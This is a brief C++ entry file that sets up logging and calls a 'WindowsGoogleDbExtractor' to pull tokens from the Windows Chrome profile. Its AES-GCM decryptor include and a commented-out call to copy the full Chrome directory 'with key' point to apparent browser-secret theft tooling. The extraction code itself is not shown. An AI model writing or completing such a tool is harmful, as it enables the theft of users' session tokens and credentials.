#include "WindowsGoogleDbExtractor.h"
#include "AesGCMDecryptor.h"

namespace
{
    void InitLoger()
    {
        // Set the default logger to file logger
        std::filesystem::create_directory("logs");
        spdlog::set_level(spdlog::level::trace); // Set global log level to debug
        auto file_logger = spdlog::basic_logger_mt("logger", "logs/log.txt");
        spdlog::set_default_logger(file_logger);
    }
}
int main()
{
    InitLoger();
    google::WindowsGoogleDbExtractor winExtractor;
    std::map<std::string, crypt::RawVector> tokens;
    winExtractor.ExtractTokens(tokens);
//    winExtractor.CopyGoogleChromeFullDirWithKey();
    return 0;
}

